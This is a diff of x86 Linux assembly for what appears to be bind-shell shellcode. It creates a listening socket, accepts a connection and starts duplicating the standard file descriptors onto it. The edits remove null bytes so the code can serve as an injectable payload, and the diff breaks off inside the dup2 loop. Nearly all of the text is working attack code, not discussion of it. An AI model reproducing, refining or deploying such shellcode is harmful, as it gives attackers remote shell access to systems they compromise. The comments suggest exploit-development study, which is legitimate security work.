@@ -27,13 +27,16 @@ _start:
 	; waits for the communication semantics, the last (protocol) 
 	; specifies a protocol to be used with the socket.
 
+	xor edi, edi
 	xor edx, edx
+	xor ebx, ebx
+	xor eax, eax
 	push edx		; *args[2] protocol <- 0x00 (IPPROTO_IP) as defined in [4]
 	push 0x01		; *args[1] type <- 0x01 (SOCK_STREAM) as defined in [5]
 	push 0x02		; *args[0] domain <- 0x02 (AF_INET) as defined in [6]
 	mov ecx, esp		; args -> points to *args[0]
-	mov ebx, 0x01 		; call <- 0x01 (SYS_SOCKET) as defined in [1]
-	mov eax, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
+	mov bl, 0x01 		; call <- 0x01 (SYS_SOCKET) as defined in [1]
+	mov al, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
 	int 0x80		; call syscall, on success (EAX <- file descriptor)
 	
 	; 0x01 - SYS_BIND also can be called by SYS_SOCKETCALL. The first argument
@@ -57,8 +60,8 @@ _start:
 	push eax		; args[0] sockfd
 	
 	mov ecx, esp		; args -> points to *args[0]
-	mov ebx, 0x02		; call <- 0x02 (SYS_BIND) as defined in [1]
-	mov eax, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
+	mov bl, 0x02		; call <- 0x02 (SYS_BIND) as defined in [1]
+	mov al, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
 	int 0x80		; call syscall, on success (EAX <- 0)
 
 	; 0x02 - SYS_LISTEN is also called with SYS_SOCKETCALL. The SYS_LISTEN
@@ -67,37 +70,38 @@ _start:
 	; sockets waiting to be accepted.
 	
 	pop edx
-	xor ecx, ecx
-	push ecx		; args[1] backlog
+	;xor ecx, ecx
+	push edi		; args[1] backlog
 	push edx		; args[0] sockfd
 	
 	mov ecx, esp		; args -> points to *args[0]
-	mov ebx, 0x04		; call <- 0x04 (SYS_LISTEN) as defined in [1]
-	mov eax, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
+	mov bl, 0x04		; call <- 0x04 (SYS_LISTEN) as defined in [1]
+	mov al, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
 	int 0x80		; call syscall, on success (EAX <- 0)
 	
 	; 0x03 - SYS_ACCEPT can too be called with SYS_SOCKETCALL. The SYS_ACCEPT
 	; constructor is like the SYS_BIND.
 	
-	xor ecx, ecx
-	push ecx		; s_addr <- 0x00 
-	push ecx		; sin_port,sin_family <- 0x00
+	;xor ecx, ecx
+	push edi		; s_addr <- 0x00 
+	push edi		; sin_port,sin_family <- 0x00
 	mov ecx, esp		; ECX -> *struct sockaddr_in
 
-	push 0x0		; args[2] addrlen 
-	push 0x0		; args[1] *addr -> *struct sockaddr_in
+	push edi		; args[2] addrlen 
+	push edi		; args[1] *addr -> *struct sockaddr_in
 	push edx		; args[0] sockfd	
 		
 	mov ecx, esp		; args -> points to *args[0]
-	mov ebx, 0x05		; call <- 0x05 (SYS_ACCEPT) as defined in [1]
-	mov eax, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
+	mov bl, 0x05		; call <- 0x05 (SYS_ACCEPT) as defined in [1]
+	mov al, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
 	int 0x80		; call syscall, on success (EAX <- new file descriptor)
 
 	; The SYS_dup2 receives two file descriptor as arguments, the old and new.
         ; /* Duplicate FD to FD2, closing FD2 and making it open on the same file.  */
         ; extern int dup2 (int __fd, int __fd2) __THROW;
 
-	mov ecx, 0x2		; loop through SYS_STDERR, SYS_STDOUT, SYS_STDIN
+	xor ecx, ecx
+	mov cl, 0x2		; loop through SYS_STDERR, SYS_STDOUT, SYS_STDIN
         mov ebx, eax            ; newfd <- SYS_ACCEPT
 loop:
 	push ecx 		
